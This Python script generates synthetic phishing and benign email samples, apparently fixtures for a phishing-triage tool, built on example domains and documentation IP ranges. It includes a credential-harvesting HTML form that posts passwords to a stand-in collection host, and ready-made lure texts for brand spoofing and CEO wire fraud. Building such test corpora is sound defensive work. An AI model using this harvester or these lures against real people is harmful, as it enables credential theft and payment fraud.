"""Generate the synthetic sample corpus under ``samples/``.

Every message uses example.com / example.net / .example domains and RFC 5737
addresses (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) so nothing points at
a real host. Attachments are inert stubs: the "PE" is a header with no code,
the "macro" is a ZIP containing a placeholder vbaProject.bin.

Run:  uv run python scripts/make_samples.py
"""

from __future__ import annotations

import email.policy
import io
import zipfile
import zlib
from email.message import EmailMessage
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
SAMPLES = ROOT / "samples"
POLICY = email.policy.default.clone(linesep="\n", max_line_length=78)

RECIPIENT = "analyst@example.com"
MX = "mx.example.com"


def received(
    from_host: str, from_ip: str, by: str, when: str, proto: str = "ESMTPS", for_: str | None = None
) -> str:
    comment = (
        f"({from_host} [{from_ip}])"
        if from_host and not from_host.startswith("[")
        else f"([{from_ip}])"
    )
    host = from_host if from_host and not from_host.startswith("[") else f"[{from_ip}]"
    tail = f" for <{for_}>" if for_ else ""
    return f"from {host} {comment} by {by} with {proto} id {zlib.crc32(when.encode()) % 0x100000:05x}{tail}; {when}"


def auth_results(
    spf: str, spf_dom: str, dkim: str, dkim_dom: str, dmarc: str, from_dom: str
) -> str:
    parts = [MX, f"spf={spf} smtp.mailfrom={spf_dom}"]
    if dkim != "-":
        parts.append(f"dkim={dkim} header.d={dkim_dom}")
    parts.append(f"dmarc={dmarc} header.from={from_dom}")
    return "; ".join(parts)


def dkim_sig(domain: str, selector: str = "sel1") -> str:
    return (
        f"v=1; a=rsa-sha256; c=relaxed/relaxed; d={domain}; s={selector}; "
        "h=from:to:subject:date:message-id; bh=47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=; "
        "b=dGhpcyBpcyBub3QgYSByZWFsIHNpZ25hdHVyZQ=="
    )


def build(
    path: Path,
    headers: list[tuple[str, str]],
    text: str,
    html: str | None = None,
    attachments: list[tuple[str, str, bytes]] | None = None,
) -> None:
    msg = EmailMessage(policy=POLICY)
    for name, value in headers:
        msg[name] = value
    msg["MIME-Version"] = "1.0"
    msg.set_content(text)
    if html is not None:
        msg.add_alternative(html, subtype="html")
    for filename, ctype, data in attachments or []:
        maintype, subtype = ctype.split("/", 1)
        msg.add_attachment(data, maintype=maintype, subtype=subtype, filename=filename)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(msg.as_bytes(policy=POLICY))
    print(f"wrote {path.relative_to(ROOT)}")


def ooxml(with_macro: bool) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types/>')
        zf.writestr("word/document.xml", '<?xml version="1.0"?><w:document/>')
        if with_macro:
            zf.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0placeholder-not-a-real-macro")
    return buf.getvalue()


PE_STUB = (
    b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
    + b"\x00" * 48
    + (b"This program cannot be run in DOS mode.\r\n$" + b"\x00" * 32)
)
PDF_STUB = b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Count 0>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
HTML_LURE = (
    b"<!DOCTYPE html><html><body><h2>Sign in to view the document</h2>"
    b'<form action="http://203.0.113.55/collect.php" method="post">'
    b'<input name="email"><input name="password" type="password"><button>Sign in</button></form>'
    b"</body></html>"
)


# --------------------------------------------------------------------------- phish


def phish() -> None:
    d = SAMPLES / "phish"

    # 01 credential harvest, lookalike domain in From and links
    build(
        d / "01-lookalike-domain.eml",
        [
            ("Return-Path", "<bounce@paypal-secure-login.example>"),
            (
                "Received",
                received(
                    "mail.paypal-secure-login.example",
                    "203.0.113.21",
                    MX,
                    "Mon, 02 Sep 2024 08:14:03 +0000",
                    for_=RECIPIENT,
                ),
            ),
            (
                "Received",
                received(
                    "[10.20.0.4]",
                    "10.20.0.4",
                    "mail.paypal-secure-login.example",
                    "Mon, 02 Sep 2024 08:14:01 +0000",
                    "ESMTPA",
                ),
            ),
            (
                "Authentication-Results",
                auth_results(
                    "pass",
                    "paypal-secure-login.example",
                    "pass",
                    "paypal-secure-login.example",
                    "none",
                    "paypal-secure-login.example",
                ),
            ),
            ("DKIM-Signature", dkim_sig("paypal-secure-login.example")),
            ("Message-ID", "<20240902081401.7f3a@paypal-secure-login.example>"),
            ("Date", "Mon, 02 Sep 2024 08:13:59 +0000"),
            ("From", '"PayPal" <service@paypal-secure-login.example>'),
            ("To", RECIPIENT),
            ("Subject", "Unusual activity on your account - verify your identity"),
        ],
        "We detected unusual activity on your PayPal account.\n\n"
        "To avoid suspension, verify your identity within 24 hours:\n"
        "https://paypal-secure-login.example/verify?id=7f3a2c\n\nPayPal Security Team\n",
        "<html><body><p>We detected unusual activity on your PayPal account.</p>"
        "<p>To avoid suspension, verify your identity within 24 hours.</p>"
        '<p><a href="https://paypal-secure-login.example/verify?id=7f3a2c">Verify now</a></p>'
        "<p>PayPal Security Team</p></body></html>",
    )

    # 02 display-name spoof of a brand + link text mismatch
    build(
        d / "02-display-name-spoof.eml",
        [
            ("Return-Path", "<alerts@example.net>"),
            (
                "Received",
                received(
                    "smtp-out.example.net",
                    "198.51.100.30",
                    MX,
                    "Tue, 03 Sep 2024 14:02:11 +0000",
                    for_=RECIPIENT,
                ),
            ),
            (
                "Authentication-Results",
                auth_results("pass", "example.net", "pass", "example.net", "none", "example.net"),
            ),
            ("DKIM-Signature", dkim_sig("example.net")),
            ("Message-ID", "<c1d2e3f4@example.net>"),
            ("Date", "Tue, 03 Sep 2024 14:02:05 +0000"),
            ("From", '"Microsoft 365 Security" <alerts@example.net>'),
            ("To", RECIPIENT),
            ("Subject", "Action required: your password expires today"),
        ],
        "Your Microsoft 365 password expires today. Sign in to keep your current password:\n\n"
        "https://account-verify.example/m365/keep\n",
        "<html><body><p>Your Microsoft 365 password expires today.</p>"
        '<p><a href="https://account-verify.example/m365/keep">Sign in to Microsoft</a> to keep your current password.</p>'
        "</body></html>",
    )

    # 03 CEO fraud: spoofed corporate From, Reply-To hijack
    build(
        d / "03-reply-to-hijack.eml",
        [
            ("Return-Path", "<x9k2@mailer-relay.example>"),
            (
                "Received",
                received(
                    "mailer-relay.example",
                    "203.0.113.88",
                    MX,
                    "Wed, 04 Sep 2024 16:45:30 +0000",
                    for_=RECIPIENT,
                ),
            ),
            (
                "Authentication-Results",
                auth_results("fail", "mailer-relay.example", "-", "", "fail", "example.com"),
            ),
            ("Message-ID", "<b7a1@mailer-relay.example>"),
            ("Date", "Wed, 04 Sep 2024 16:45:12 +0000"),
            ("From", '"Dana Whitfield" <dana.whitfield@example.com>'),
            ("Reply-To", "dana.whitfield.ceo@freemail.example"),
            ("To", RECIPIENT),
            ("Subject", "Quick favor - urgent"),
        ],
        "Hi,\n\nI'm in a meeting and can't talk. I need you to process a wire transfer today "
        "for a vendor before close of business. Reply to this email and I'll send the details. "
        "Please keep this confidential.\n\nDana\nSent from my iPhone\n",
    )

    # 04 link text mismatch, DocuSign lure
    build(
        d / "04-link-text-mismatch.eml",
        [
            ("Return-Path", "<notify@example.net>"),
            (
                "Received",
                received(
                    "out2.example.net",
                    "198.51.100.31",
                    MX,
                    "Thu, 05 Sep 2024 09:20:44 +0000",
                    for_=RECIPIENT,
                ),
            ),
            (
                "Authentication-Results",
                auth_results("pass", "example.net", "pass", "example.net", "none", "example.net"),
            ),
            ("DKIM-Signature", dkim_sig("example.net")),
            ("Message-ID", "<ds-4471@example.net>"),
            ("Date", "Thu, 05 Sep 2024 09:20:40 +0000"),
            ("From", '"DocuSign" <notify@example.net>'),
            ("To", RECIPIENT),
            ("Subject", "Completed: Please review and sign - Contract Amendment"),
        ],
        "Your document is ready for signature. Review it here:\n"
        "https://docs-review.example/s/4471\n",
        "<html><body><p>Your document is ready for signature.</p>"
        '<p><a href="https://docs-review.example/s/4471">https://www.docusign.example/Signing/EmailStart.aspx?a=4471</a></p>'
        "<p>This link will expire in 48 hours.</p></body></html>",
    )

    # 05 shortened URL, spoofed shipping brand, SPF softfail
    build(
        d / "05-shortened-url.eml",
        [
            ("Return-Path", "<track@example.net>"),
            (
                "Received",
                received(
                    "vps-2201.hosting.example",
                    "203.0.113.140",
                    MX,
                    "Fri, 06 Sep 2024 11:05:19 +0000",
                    for_=RECIPIENT,
                ),
            ),
            (
                "Authentication-Results",
                auth_results("softfail", "example.net", "none", "", "fail", "example.net"),
            ),
            ("Message-ID", "<ship-88121@example.net>"),
            ("Date", "Fri, 06 Sep 2024 11:05:02 +0000"),
            ("From", '"UPS Delivery" <track@example.net>'),
            ("To", RECIPIENT),
            ("Subject", "Your package could not be delivered - action required"),
        ],
        "We attempted to deliver your package but no one was available.\n"
        "Reschedule your delivery within 24 hours or the package will be returned:\n"
        "https://bit.ly/3xAmpLe\n",
    )

    # 06 raw-IP URL, display name embeds a different address, no auth headers
    build(
        d / "06-raw-ip-url.eml",
        [
            (
                "Received",
                received(
                    "mail-corp.example",
                    "203.0.113.200",
                    MX,
                    "Mon, 09 Sep 2024 07:31:55 +0000",
                    for_=RECIPIENT,
                ),
            ),
            ("Message-ID", "<mbx-9@mail-corp.example>"),
            ("Date", "Mon, 09 Sep 2024 07:31:50 +0000"),
            ("From", '"helpdesk@example.com" <it-support@mail-corp.example>'),
            ("To", RECIPIENT),
            ("Subject", "Mailbox storage full - unusual sign-in detected"),
        ],
        "Your mailbox has exceeded its storage limit and we detected an unusual sign-in.\n"
        "Validate your account immediately to avoid suspension:\n"
        "http://203.0.113.200/owa/auth/logon.aspx\n\nIT Helpdesk\n",
    )

    # 07 double-extension executable attachment
    build(
        d / "07-double-extension.eml",
        [
            ("Return-Path", "<ar@example.net>"),
            (
                "Received",
                received(
                    "mail.example.net",
                    "192.0.2.10",
                    MX,
                    "Tue, 10 Sep 2024 13:12:00 +0000",
                    for_=RECIPIENT,
                ),
            ),
            (
                "Authentication-Results",
                auth_results("pass", "example.net", "pass", "example.net", "none", "example.net"),
            ),
            ("DKIM-Signature", dkim_sig("example.net")),
            ("Message-ID", "<inv-2291@example.net>"),
            ("Date", "Tue, 10 Sep 2024 13:11:48 +0000"),
            ("From", '"Accounts Receivable" <ar@example.net>'),
            ("To", RECIPIENT),
            ("Subject", "Overdue invoice 2291 - payment overdue"),
        ],
        "Please see the attached overdue invoice. Payment is 30 days overdue.\n",
        attachments=[("Invoice_2291.pdf.exe", "application/pdf", PE_STUB)],
    )

    # 08 macro-enabled document, SPF fail + DMARC fail
    build(
        d / "08-macro-doc.eml",
        [
            ("Return-Path", "<ap@example.net>"),
            (
                "Received",
                received(
                    "bulk-7.sendhost.example",
                    "203.0.113.77",
                    MX,
                    "Wed, 11 Sep 2024 10:00:31 +0000",
                    for_=RECIPIENT,
                ),
            ),
            (
                "Authentication-Results",
                auth_results("fail", "example.net", "none", "", "fail", "example.net"),
            ),
            ("Message-ID", "<po-1188@example.net>"),
            ("Date", "Wed, 11 Sep 2024 10:00:20 +0000"),
            ("From", '"Accounts Payable" <ap@example.net>'),
            ("To", RECIPIENT),
            ("Subject", "Purchase order 1188 - remittance advice attached"),
        ],
        "Please find the remittance advice attached. Enable editing and content to view.\n",
        attachments=[
            (
                "Remittance_1188.docm",
                "application/vnd.ms-word.document.macroEnabled.12",
                ooxml(with_macro=True),
            )
        ],
    )

    # 09 invoice / payment urgency lure with Reply-To hijack and file-host link
    build(
        d / "09-invoice-urgency.eml",
        [
            ("Return-Path", "<billing@example.net>"),
            (
                "Received",
                received(
                    "mail.example.net",
                    "192.0.2.10",
                    MX,
                    "Thu, 12 Sep 2024 15:44:09 +0000",
                    for_=RECIPIENT,
                ),
            ),
            (
                "Authentication-Results",
                auth_results("pass", "example.net", "pass", "example.net", "none", "example.net"),
            ),
            ("DKIM-Signature", dkim_sig("example.net")),
            ("Message-ID", "<fin-3301@example.net>"),
            ("Date", "Thu, 12 Sep 2024 15:44:00 +0000"),
            ("From", '"accounts@example.com" <billing@example.net>'),
            ("Reply-To", "accounts.payable.desk@freemail.example"),
            ("To", RECIPIENT),
            ("Subject", "FINAL NOTICE: outstanding balance - legal action"),
        ],
        "This is your final notice. Your outstanding balance of $4,860.00 must be paid within 24 hours "
        "or we will be forced to pursue legal action.\n\nView the invoice: https://files-share.example/d/9f8e7d/invoice.pdf\n"
        "Reply to this email to arrange payment.\n",
    )

    # 10 the aligned-vs-authenticated case: SPF and DKIM pass for the attacker's domain, DMARC fails for From
    build(
        d / "10-dmarc-fail-dkim-unrelated.eml",
        [
            ("Return-Path", "<bounce@notify-mailer.example>"),
            (
                "Received",
                received(
                    "out.notify-mailer.example",
                    "198.51.100.90",
                    MX,
                    "Fri, 13 Sep 2024 06:58:12 +0000",
                    for_=RECIPIENT,
                ),
            ),
            (
                "Authentication-Results",
                auth_results(
                    "pass",
                    "notify-mailer.example",
                    "pass",
                    "notify-mailer.example",
                    "fail",
                    "chase.com",
                ),
            ),
            ("DKIM-Signature", dkim_sig("notify-mailer.example", "mailer")),
            ("Message-ID", "<alert-55@notify-mailer.example>"),
            ("Date", "Fri, 13 Sep 2024 06:58:01 +0000"),
            ("From", '"Chase" <alerts@chase.com>'),
            ("To", RECIPIENT),
            ("Subject", "Suspicious activity: sign in to review your account"),
        ],
        "We noticed suspicious activity on your account. Sign in to review recent transactions:\n"
        "https://chase-secure-alerts.example/review\n",
    )

    # 11 punycode / IDN domain
    build(
        d / "11-punycode-domain.eml",
        [
            ("Return-Path", "<no-reply@example.net>"),
            (
                "Received",
                received(
                    "relay-9.example.net",
                    "198.51.100.12",
                    MX,
                    "Mon, 16 Sep 2024 12:30:00 +0000",
                    for_=RECIPIENT,
                ),
            ),
            (
                "Authentication-Results",
                auth_results("softfail", "example.net", "none", "", "none", "example.net"),
            ),
            ("Message-ID", "<idn-1@example.net>"),
            ("Date", "Mon, 16 Sep 2024 12:29:41 +0000"),
            ("From", '"Apple ID" <no-reply@example.net>'),
            ("To", RECIPIENT),
            ("Subject", "Your Apple ID has been locked"),
        ],
        "Your Apple ID has been locked for security reasons. Confirm your identity to restore access:\n"
        "https://xn--ppl-hia8d.example/restore\n",
    )

    # 12 HTML attachment credential harvester
    build(
        d / "12-html-attachment.eml",
        [
            ("Return-Path", "<share@example.net>"),
            (
                "Received",
                received(
                    "mail.example.net",
                    "192.0.2.10",
                    MX,
                    "Tue, 17 Sep 2024 09:09:09 +0000",
                    for_=RECIPIENT,
                ),
            ),
            (
                "Authentication-Results",
                auth_results("pass", "example.net", "pass", "example.net", "none", "example.net"),
            ),
            ("DKIM-Signature", dkim_sig("example.net")),
            ("Message-ID", "<od-1@example.net>"),
            ("Date", "Tue, 17 Sep 2024 09:09:00 +0000"),
            ("From", '"Microsoft OneDrive" <share@example.net>'),
            ("To", RECIPIENT),
            ("Subject", "A document was shared with you"),
        ],
        "A document has been shared with you. Open the attached file and sign in to view it.\n",
        attachments=[("Shared_Document.html", "text/html", HTML_LURE)],
    )


# --------------------------------------------------------------------------- benign


def benign() -> None:
    d = SAMPLES / "benign"

    # 01 newsletter
    build(
        d / "01-newsletter.eml",
        [
            ("Return-Path", "<bounce-12345@news.example.net>"),
            (
                "Received",
                received(
                    "mta-4.news.example.net",
                    "192.0.2.40",
                    MX,
                    "Mon, 02 Sep 2024 12:00:10 +0000",
                    for_=RECIPIENT,
                ),
            ),
            (
                "Authentication-Results",
                auth_results(
                    "pass", "news.example.net", "pass", "example.net", "pass", "example.net"
                ),
            ),
            ("DKIM-Signature", dkim_sig("example.net", "news")),
            ("List-Unsubscribe", "<https://news.example.net/unsubscribe?u=12345>"),
            ("Message-ID", "<nl-2024-36@news.example.net>"),
            ("Date", "Mon, 02 Sep 2024 12:00:00 +0000"),
            ("From", '"Example Weekly" <newsletter@example.net>'),
            ("To", RECIPIENT),
            ("Subject", "Example Weekly #36: September releases and an exclusive offer"),
        ],
        "This week: three new releases, a community spotlight, and an exclusive offer for subscribers.\n\n"
        "Read online: https://news.example.net/issues/36\nUnsubscribe: https://news.example.net/unsubscribe?u=12345\n",
        "<html><body><h1>Example Weekly #36</h1><p>Three new releases, a community spotlight, and an exclusive offer.</p>"
        '<p><a href="https://news.example.net/issues/36">Read online</a> | '
        '<a href="https://news.example.net/unsubscribe?u=12345">Unsubscribe</a></p></body></html>',
    )

    # 02 legitimate password reset
    build(
        d / "02-password-reset.eml",
        [
            ("Return-Path", "<no-reply@accounts.example.com>"),
            (
                "Received",
                received(
                    "mail-a.accounts.example.com",
                    "192.0.2.55",
                    MX,
                    "Tue, 03 Sep 2024 18:22:31 +0000",
                    for_=RECIPIENT,
                ),
            ),
            (
                "Received",
                received(
                    "[10.30.1.7]",
                    "10.30.1.7",
                    "mail-a.accounts.example.com",
                    "Tue, 03 Sep 2024 18:22:30 +0000",
                    "ESMTPA",
                ),
            ),
            (
                "Authentication-Results",
                auth_results(
                    "pass", "accounts.example.com", "pass", "example.com", "pass", "example.com"
                ),
            ),
            ("DKIM-Signature", dkim_sig("example.com", "acct")),
            ("Message-ID", "<reset-88a@accounts.example.com>"),
            ("Date", "Tue, 03 Sep 2024 18:22:29 +0000"),
            ("From", '"Example Accounts" <no-reply@accounts.example.com>'),
            ("To", RECIPIENT),
            ("Subject", "Reset your password"),
        ],
        "We received a request to reset your password. Use the link below within 24 hours:\n"
        "https://accounts.example.com/reset?token=88a1\n\nIf you didn't request this, you can ignore this email.\n",
        "<html><body><p>We received a request to reset your password.</p>"
        '<p><a href="https://accounts.example.com/reset?token=88a1">Reset your password</a> (link valid for 24 hours)</p>'
        "<p>If you didn't request this, you can ignore this email.</p></body></html>",
    )

    # 03 code-hosting notification (GitHub-style, on a documentation domain)
    build(
        d / "03-github-notification.eml",
        [
            ("Return-Path", "<noreply@git.example.net>"),
            (
                "Received",
                received(
                    "out-18.smtp.git.example.net",
                    "192.0.2.118",
                    MX,
                    "Wed, 04 Sep 2024 21:14:02 +0000",
                    for_=RECIPIENT,
                ),
            ),
            (
                "Authentication-Results",
                auth_results(
                    "pass", "git.example.net", "pass", "git.example.net", "pass", "git.example.net"
                ),
            ),
            ("DKIM-Signature", dkim_sig("git.example.net", "pf2023")),
            ("Message-ID", "<example/phishtriage/pull/12/c2345@git.example.net>"),
            ("Date", "Wed, 04 Sep 2024 21:14:00 +0000"),
            ("From", '"Priya Natarajan" <notifications@git.example.net>'),
            ("Reply-To", "example/phishtriage <reply+ABC123@reply.git.example.net>"),
            ("To", RECIPIENT),
            ("Subject", "Re: [example/phishtriage] Add RDAP enricher (PR #12)"),
        ],
        "@analyst looks good, one nit on the cache TTL. Approved.\n\n"
        "--\nReply to this email directly or view it on the web:\n"
        "https://git.example.net/example/phishtriage/pull/12#issuecomment-2345\n",
        "<html><body><p>@analyst looks good, one nit on the cache TTL. Approved.</p>"
        '<p><a href="https://git.example.net/example/phishtriage/pull/12#issuecomment-2345">View it on the web</a></p></body></html>',
    )

    # 04 internal email with no auth headers at all: deliberate calibration case
    build(
        d / "04-internal-no-auth.eml",
        [
            (
                "Received",
                received(
                    "exch-02.corp.example.com",
                    "10.1.5.22",
                    "exch-01.corp.example.com",
                    "Thu, 05 Sep 2024 08:45:12 +0000",
                    "ESMTP",
                    for_=RECIPIENT,
                ),
            ),
            ("Message-ID", "<9a8b7c@exch-02.corp.example.com>"),
            ("Date", "Thu, 05 Sep 2024 08:45:10 +0000"),
            ("From", '"Sam Rivera" <sam.rivera@example.com>'),
            ("To", RECIPIENT),
            ("Subject", "Team lunch Thursday?"),
        ],
        "Thinking Thursday at noon, the usual place. Let me know if that works.\n\nSam\n",
    )

    # 05 legitimate invoice with a PDF attachment
    build(
        d / "05-invoice-pdf.eml",
        [
            ("Return-Path", "<invoices@billing.example.net>"),
            (
                "Received",
                received(
                    "smtp.example.net",
                    "198.51.100.7",
                    MX,
                    "Fri, 06 Sep 2024 08:00:05 +0000",
                    for_=RECIPIENT,
                ),
            ),
            (
                "Authentication-Results",
                auth_results(
                    "pass", "billing.example.net", "pass", "example.net", "pass", "example.net"
                ),
            ),
            ("DKIM-Signature", dkim_sig("example.net", "billing")),
            ("Message-ID", "<inv-4471@billing.example.net>"),
            ("Date", "Fri, 06 Sep 2024 07:59:58 +0000"),
            ("From", '"Example Billing" <invoices@billing.example.net>'),
            ("To", RECIPIENT),
            ("Subject", "Invoice 4471 for September"),
        ],
        "Hi,\n\nInvoice 4471 for September is attached. Net 30 as usual.\n\nThanks,\nExample Billing\n",
        attachments=[("invoice-4471.pdf", "application/pdf", PDF_STUB)],
    )

    # 06 colleague sharing a document
    build(
        d / "06-shared-doc.eml",
        [
            ("Return-Path", "<jordan.lee@example.com>"),
            (
                "Received",
                received(
                    "mail-b.example.com",
                    "192.0.2.56",
                    MX,
                    "Mon, 09 Sep 2024 10:10:10 +0000",
                    for_=RECIPIENT,
                ),
            ),
            (
                "Received",
                received(
                    "[10.30.1.9]",
                    "10.30.1.9",
                    "mail-b.example.com",
                    "Mon, 09 Sep 2024 10:10:08 +0000",
                    "ESMTPA",
                ),
            ),
            (
                "Authentication-Results",
                auth_results("pass", "example.com", "pass", "example.com", "pass", "example.com"),
            ),
            ("DKIM-Signature", dkim_sig("example.com")),
            ("Message-ID", "<share-17@example.com>"),
            ("Date", "Mon, 09 Sep 2024 10:10:05 +0000"),
            ("From", '"Jordan Lee" <jordan.lee@example.com>'),
            ("To", RECIPIENT),
            ("Subject", "Q3 incident review notes"),
        ],
        "Attached the notes from this morning. Also on the share drive: https://files.example.com/d/q3-review\n\nJordan\n",
        attachments=[
            (
                "Q3-incident-review.docx",
                "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                ooxml(with_macro=False),
            )
        ],
    )


if __name__ == "__main__":
    phish()
    benign()
